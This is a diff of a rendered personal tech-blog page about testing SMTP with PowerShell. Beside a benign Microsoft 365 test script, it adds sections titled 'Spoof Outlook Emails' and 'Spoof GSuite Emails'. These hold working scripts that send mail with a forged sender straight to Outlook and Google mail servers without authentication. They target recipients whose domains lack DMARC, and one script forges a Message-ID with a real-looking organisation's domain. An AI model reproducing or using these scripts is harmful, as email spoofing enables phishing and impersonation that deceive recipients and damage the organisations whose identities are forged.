@@ -12,8 +12,8 @@
     
     <link rel="stylesheet" href="http://localhost:1313/css/style.css">
 
-    <link href="http://localhost:1313/archive/index.xml" rel="alternate" type="application/rss+xml" title="Ghostfeed" />
-    <link href="http://localhost:1313/archive/index.xml" rel="feed" type="application/rss+xml" title="Ghostfeed" />
+    <link href="http://localhost:1313/categories/stub/index.xml" rel="alternate" type="application/rss+xml" title="Ghostfeed" />
+    <link href="http://localhost:1313/categories/stub/index.xml" rel="feed" type="application/rss+xml" title="Ghostfeed" />
 </head>
 
 <body class="page">
@@ -51,8 +51,6 @@
     <h2>Recently Modified</h2>
     <ul>
         
-        <li><a href="http://localhost:1313/posts/2025-07-30-exchange-inbox-rules/">Exchange Inbox Rules on 2025-07-31</a></li>
-        
         <li><a href="http://localhost:1313/posts/2025-07-03-smtp-test-with-powershell/">Test SMTP on 2025-07-02</a></li>
         
         <li><a href="http://localhost:1313/posts/2025-07-02-videos-as-teams-backgrounds/">Videos as Teams Backgrounds on 2025-07-02</a></li>
@@ -70,6 +68,8 @@
         <li><a href="http://localhost:1313/posts/2024-07-30-batch-compress-images/">Automated Batch Image Compression with Python on 2024-07-30</a></li>
         
         <li><a href="http://localhost:1313/posts/2024-06-24-get-public-ip/">How to Find Your Public IP Address on 2024-06-24</a></li>
+        
+        <li><a href="http://localhost:1313/posts/2024-06-06-dns-records/">Complete DNS Records Reference Guide on 2024-06-06</a></li>
         
     </ul>
 </section>
@@ -120,15 +120,21 @@
         
         <nav id="TableOfContents">
   <ul>
-    <li><a href="#smtp-test-with-starttls-and-tls-12">SMTP Test with STARTTLS and TLS 1.2</a>
+    <li><a href="#outlook-smtp-test-with-starttls-and-tls-12">Outlook SMTP Test with STARTTLS and TLS 1.2</a>
       <ul>
-        <li><a href="#--prerequisites">- Prerequisites</a></li>
+        <li><a href="#prerequisites">Prerequisites</a></li>
         <li><a href="#--script">- Script</a></li>
       </ul>
     </li>
-    <li><a href="#smtp-test-with-no-authentication">SMTP Test with no authentication</a>
+    <li><a href="#spoof-outlook-emails">Spoof Outlook Emails</a>
       <ul>
-        <li><a href="#--prerequisites-1">- Prerequisites</a></li>
+        <li><a href="#prerequisites-1">Prerequisites</a></li>
+        <li><a href="#script">Script</a></li>
+      </ul>
+    </li>
+    <li><a href="#spoof-gsuite-emails">Spoof GSuite Emails</a>
+      <ul>
+        <li><a href="#prerequisites-2">Prerequisites</a></li>
         <li><a href="#--script-1">- Script</a></li>
       </ul>
     </li>
@@ -136,16 +142,10 @@
 </nav>
         <hr>
         
-        <h2 id="smtp-test-with-starttls-and-tls-12">SMTP Test with STARTTLS and TLS 1.2</h2>
-<p>This post documents a simple PowerShell script to verify SMTP connectivity against Microsoft 365 (Office 365) using TLS 1.2. It’s useful for troubleshooting mail flow issues or confirming that SMTP AUTH is properly enabled on your tenant and mailbox.</p>
-<h3 id="--prerequisites">- Prerequisites</h3>
-<ul>
-<li>A Microsoft 365 (Office 365) mailbox with <strong>SMTP AUTH</strong> enabled</li>
-<li>The Microsoft 365 mailbox must be licensed.</li>
-</ul>
-<blockquote>
-<p><strong>Note:</strong> If your tenant has SMTP AUTH disabled globally, you’ll need to enable it either per-user or at the organization level in the Exchange admin center.</p>
-</blockquote>
+        <h2 id="outlook-smtp-test-with-starttls-and-tls-12">Outlook SMTP Test with STARTTLS and TLS 1.2</h2>
+<h3 id="prerequisites">Prerequisites</h3>
+<p><em>-</em> A licensed Microsoft 365 mailbox with Exchange Online.</p>
+<p><em>-</em> <strong>SMTP AUTH</strong> must be enabled. If your tenant has SMTP AUTH disabled globally, you’ll need to enable it either per-user or at the organization level in the Exchange admin center.</p>
 <h3 id="--script">- Script</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Force TLS 1.2 for secure connections</span>
 </span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">Net.ServicePointManager</span>]::SecurityProtocol = [<span style="color:#66d9ef">Net.SecurityProtocolType</span>]::Tls12
@@ -170,14 +170,10 @@
 </span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> {
 </span></span><span style="display:flex;"><span>    Write-Output <span style="color:#e6db74">&#34;Failed to send SMTP test email. Error: </span>$_<span style="color:#e6db74">&#34;</span>
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h2 id="smtp-test-with-no-authentication">SMTP Test with no authentication</h2>
-<h3 id="--prerequisites-1">- Prerequisites</h3>
-<ul>
-<li>The public IP address of the organization must be added to the SPF record of the domain.</li>
-<li>The script must be run from behind the same public IP address in the SPF record.</li>
-<li>The $smtpServer variable does not use <code>smtp.office365.com</code> because this script does not use authentication.</li>
-</ul>
-<h3 id="--script-1">- Script</h3>
+</span></span></code></pre></div><h2 id="spoof-outlook-emails">Spoof Outlook Emails</h2>
+<h3 id="prerequisites-1">Prerequisites</h3>
+<p><em>-</em> The $toAddress should be an Outlook recipient whose domain is not protected by DMARC.</p>
+<h3 id="script">Script</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$smtpServer = <span style="color:#e6db74">&#34;domain-com.mail.protection.outlook.com&#34;</span>
 </span></span><span style="display:flex;"><span>$smtpPort = <span style="color:#ae81ff">25</span>
 </span></span><span style="display:flex;"><span>$fromAddress = <span style="color:#e6db74">&#34;fromuser@domain.com&#34;</span>
@@ -192,6 +188,36 @@
 </span></span><span style="display:flex;"><span>    Write-Output <span style="color:#e6db74">&#34;SMTP test email sent successfully.&#34;</span>
 </span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> {
 </span></span><span style="display:flex;"><span>    Write-Output <span style="color:#e6db74">&#34;Failed to send SMTP test email. Error: </span>$_<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="spoof-gsuite-emails">Spoof GSuite Emails</h2>
+<h3 id="prerequisites-2">Prerequisites</h3>
+<p><em>-</em> The $toAddress should be a GSuite recipient whose domain is not protected by DMARC.</p>
+<h3 id="--script-1">- Script</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$smtpServer = <span style="color:#e6db74">&#34;aspmx.l.google.com&#34;</span>
+</span></span><span style="display:flex;"><span>$smtpPort = <span style="color:#ae81ff">25</span>
+</span></span><span style="display:flex;"><span>$fromAddress = <span style="color:#e6db74">&#34;fromuser@domain.com&#34;</span>
+</span></span><span style="display:flex;"><span>$toAddress = <span style="color:#e6db74">&#34;touser@domain.com&#34;</span>
+</span></span><span style="display:flex;"><span>$subject = <span style="color:#e6db74">&#34;SMTP Test Email&#34;</span>
+</span></span><span style="display:flex;"><span>$body = <span style="color:#e6db74">&#34;This is a test email, sent via a PowerShell script.&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$messageID = <span style="color:#e6db74">&#34;&lt;&#34;</span> + [<span style="color:#66d9ef">System.Guid</span>]::NewGuid().ToString() + <span style="color:#e6db74">&#34;@darbycreekcounseling.org&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>$dateHeader = [<span style="color:#66d9ef">DateTime</span>]::Now.ToString(<span style="color:#e6db74">&#34;R&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$message = New-Object System.Net.Mail.MailMessage
+</span></span><span style="display:flex;"><span>$message.From = $fromAddress
+</span></span><span style="display:flex;"><span>$message.To.Add($toAddress)
+</span></span><span style="display:flex;"><span>$message.Subject = $subject
+</span></span><span style="display:flex;"><span>$message.Body = $body
+</span></span><span style="display:flex;"><span>$message.Headers.Add(<span style="color:#e6db74">&#34;Message-ID&#34;</span>, $messageID)
+</span></span><span style="display:flex;"><span>$message.Headers.Add(<span style="color:#e6db74">&#34;Date&#34;</span>, $dateHeader)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$smtp = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>    Write-Output <span style="color:#e6db74">&#34;Spoofing GSuite email...&#34;</span>
+</span></span><span style="display:flex;"><span>    $smtp.Send($message)
+</span></span><span style="display:flex;"><span>    Write-Output <span style="color:#e6db74">&#34;Email spoofed successfully.&#34;</span>
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> {
+</span></span><span style="display:flex;"><span>    Write-Output <span style="color:#e6db74">&#34;Failed to spoof email. Error: </span>$_<span style="color:#e6db74">&#34;</span>
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div>
     </section>
@@ -276,7 +302,7 @@
         
         <li><a href="http://localhost:1313/categories/p5.js/">P5.js (9)</a></li>
         
-        <li><a href="http://localhost:1313/categories/powershell/">PowerShell (27)</a></li>
+        <li><a href="http://localhost:1313/categories/powershell/">PowerShell (25)</a></li>
         
         <li><a href="http://localhost:1313/categories/processing/">Processing (14)</a></li>
         
@@ -344,13 +370,11 @@
         
         <li><a href="http://localhost:1313/tags/audio-conversion/">Audio Conversion (1)</a></li>
         
-        <li><a href="http://localhost:1313/tags/automation/">Automation (14)</a></li>
+        <li><a href="http://localhost:1313/tags/automation/">Automation (13)</a></li>
         
         <li><a href="http://localhost:1313/tags/azure/">Azure (4)</a></li>
         
         <li><a href="http://localhost:1313/tags/azure-ad-connect/">Azure Ad Connect (1)</a></li>
-        
-        <li><a href="http://localhost:1313/tags/azuread/">AzureAD (1)</a></li>
         
         <li><a href="http://localhost:1313/tags/base64/">Base64 (1)</a></li>
         
@@ -383,8 +407,6 @@
         <li><a href="http://localhost:1313/tags/compliance/">Compliance (1)</a></li>
         
         <li><a href="http://localhost:1313/tags/computer-vision/">Computer-Vision (3)</a></li>
-        
-        <li><a href="http://localhost:1313/tags/conditional-access/">Conditional Access (1)</a></li>
         
         <li><a href="http://localhost:1313/tags/coqui-tts/">Coqui-Tts (1)</a></li>
         
@@ -450,7 +472,7 @@
         
         <li><a href="http://localhost:1313/tags/events/">Events (1)</a></li>
         
-        <li><a href="http://localhost:1313/tags/exchange/">Exchange (2)</a></li>
+        <li><a href="http://localhost:1313/tags/exchange/">Exchange (1)</a></li>
         
         <li><a href="http://localhost:1313/tags/exchange-management/">Exchange-Management (1)</a></li>
         
@@ -566,8 +588,6 @@
         
         <li><a href="http://localhost:1313/tags/merge-sort/">Merge Sort (1)</a></li>
         
-        <li><a href="http://localhost:1313/tags/microsoft-graph/">Microsoft Graph (1)</a></li>
-        
         <li><a href="http://localhost:1313/tags/microsoft-teams/">Microsoft Teams (1)</a></li>
         
         <li><a href="http://localhost:1313/tags/microsoft-office/">Microsoft-Office (1)</a></li>
@@ -648,7 +668,7 @@
         
         <li><a href="http://localhost:1313/tags/port-management/">Port-Management (1)</a></li>
         
-        <li><a href="http://localhost:1313/tags/powershell/">PowerShell (23)</a></li>
+        <li><a href="http://localhost:1313/tags/powershell/">PowerShell (22)</a></li>
         
         <li><a href="http://localhost:1313/tags/prims-algorithm/">Prim&#39;s Algorithm (1)</a></li>
         
